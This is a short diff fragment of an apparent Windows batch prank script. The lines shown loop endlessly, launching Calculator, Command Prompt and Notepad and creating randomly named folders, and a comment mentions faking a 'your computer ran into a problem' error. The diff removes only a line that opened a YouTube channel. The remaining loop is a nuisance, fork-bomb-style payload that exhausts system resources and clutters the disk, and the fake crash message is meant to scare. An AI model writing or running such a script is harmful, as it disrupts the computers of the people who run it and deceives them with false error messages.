@@ -123,7 +123,6 @@ Rem make the error your computer ran into a problem show up
 start calculator
 start command prompt
 start Notepad
-start https://www.youtube.com/channel/UCJmwzfUweWlynmmF4G8R7WA
 md%random%
 /folder.
 goto x
